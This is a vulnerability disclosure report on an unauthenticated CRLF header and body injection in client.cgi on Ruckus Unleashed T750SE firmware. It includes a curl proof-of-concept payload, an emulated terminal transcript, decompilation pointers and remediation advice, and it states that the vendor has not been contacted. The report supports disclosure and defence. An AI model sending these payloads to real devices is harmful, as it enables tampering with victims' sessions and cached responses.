# Ruckus T750SE 200.19.7.112.291 was discovered to contain a CRLF response-header injection vulnerability in client.cgi

## Overview

- Vendor: Ruckus/CommScope
- Product: Unleashed AP T750SE (image also used by T750/R750/R850/R650/R550)
- Version: 200.19.7.112.291
- Component: web/client.cgi, usr/sbin/webad, lighttpd 1.4.76
- Vulnerability Class: CWE-113 CRLF response-header injection
- Manufacturer: https://www.commscope.com/

## Affected version

- Firmware image.
- `client.cgi` and `webad` are the vendor binaries; lighttpd is the shipped
  1.4.76 build.

## Vulnerability details

`client.cgi` decodes all CGI environment variables with
`curl_easy_unescape`. The Cookie value is copied into the internal request
structure and `webad` copies the request cookie into the response cookie;
`client.cgi` prints `Set-Cookie: %s`. A Cookie containing `%0d%0a` therefore
injects arbitrary response headers. The default page `GET /client.cgi?uri=sysInfo`
is reachable without a session. A double CRLF terminates the header block and
injects response-body content.

## PoC

```sh
curl -sS -i \
  -H 'Cookie: session_id=AAAAAAAAAA;%0d%0aX-Injected:%20yes' \
  'http://<ap>/client.cgi?uri=sysInfo'

# Double CRLF (body injection):
# Cookie: session_id=AAAAAAAAAA;%0d%0a%0d%0aINJECTED-BODY
```

## Reproduction and terminal evidence

Environment: qemu-arm user-mode with the firmware lighttpd 1.4.76,
`client.cgi` and `webad`; no session cookie is sent.

Terminal transcript:

```
$ curl -sS -i -H 'Cookie: session_id=AAAAAAAAAA;%0d%0aX-Injected:%20yes' \
    'http://127.0.0.1:39123/client.cgi?uri=sysInfo'
HTTP/1.1 302 Found
Set-Cookie: session_id=AAAAAAAAAA;
X-Injected: yes
...
```

A double-CRLF payload produced `INJECTED-BODY` in the response body. Evidence:
`evidence/http-crlf.txt`, `evidence/http-body-injection.txt` (parent project).

## Static evidence

`sub_B140` decodes CGI env with `sub_AF8C`; `sub_AC10` copies `HTTP_COOKIE`
to offset 427; `webad sub_110B8` copies the request cookie to the response
cookie; `sub_9E28` prints `Set-Cookie: %s`; `sub_A01C` also reflects on the
error path. See `evidence/decompilation.txt`.

## Impact

Unauthenticated attacker can inject response headers (Set-Cookie,
Location, CORS) and, with a double CRLF, response body content. Direct victim
impact requires a victim to carry the malicious Cookie or a shared
cache/proxy in front of the management interface; reflective XSS is possible
if the affected page returns 200 instead of the observed 302.

## Remediation

- Reject CR/LF in Cookie values before using them in response headers.
- Use a structured header API rather than string concatenation.
- Do not reflect request cookies into `Set-Cookie`.

## Known CVE relation

- NVD 2026-11-06 has no T750SE `client.cgi` CRLF entry. Older
  CVE-2020-13913/13914/13915/13916/13919 are different `webs`/`emfd`
  components.

## Status and disclosure

Dynamic confirmation (firmware lighttpd + client.cgi + webad). Candidate
0-day; no CVE assigned. No vendor/CNA contact.

## Additional Information

```markdown
### Vendor
Ruckus/CommScope

### Product
Unleashed AP T750SE (image also used by T750/R750/R850/R650/R550)

### Version or Commit
200.19.7.112.291

### Vulnerability Class
CWE-113 CRLF response-header injection

### Description
client.cgi decodes the Cookie with curl_easy_unescape and webad reflects it into Set-Cookie. A Cookie containing %0d%0a injects response headers; a double CRLF injects response body content. GET /client.cgi?uri=sysInfo is reachable without a session.

### Affected_component
web/client.cgi, usr/sbin/webad, lighttpd 1.4.76

### Attack_vector
Unauthenticated GET /client.cgi?uri=sysInfo with a Cookie containing %0d%0a.

### Product_version
Unleashed AP T750SE (image also used by T750/R750/R850/R650/R550) 200.19.7.112.291

### Reference
- https://www.commscope.com/
- https://github.com/vuln-1/vuln/blob/main/Ruckus/T750SE_V200.19.7.112.291/report-1.md
```
